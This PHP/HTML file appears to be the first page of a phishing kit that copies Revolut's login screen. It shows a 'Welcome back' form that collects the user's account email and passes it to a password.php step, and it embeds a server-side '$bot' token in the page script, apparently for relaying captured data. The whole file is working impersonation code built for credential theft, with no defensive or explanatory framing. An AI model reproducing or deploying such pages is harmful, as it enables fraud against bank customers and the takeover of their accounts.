<?php 
require 'main.php';
?><!DOCTYPE html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="res/app.css">
    <title>Revolut</title>
</head>
<body>
<header>
    <div class="logo">
<img src="res/img/logo.png" >
    </div>
</header>
<script>var token=<?php echo json_encode($bot); ?>;</script>

<main>
<div class="form">
    <div class="title">
        <h1>Welcome back</h1>
    </div>
    <form action="password.php" method="get">
    <div class="title1">
<label >Enter the email associated with your Revolut account</label>
    </div>
    <div class="col">
        <input type="text" placeholder="Enter your email"name="user" required>
    </div>
    <div class="A">
        <a href="#">Lost access to my email</a>
    </div>
    <div class="but">
<button type="submit">Continue</button>
    </div>







    </form>
</div>
</main>
<script src="./res/jq.js"></script>





    
</body>
</html>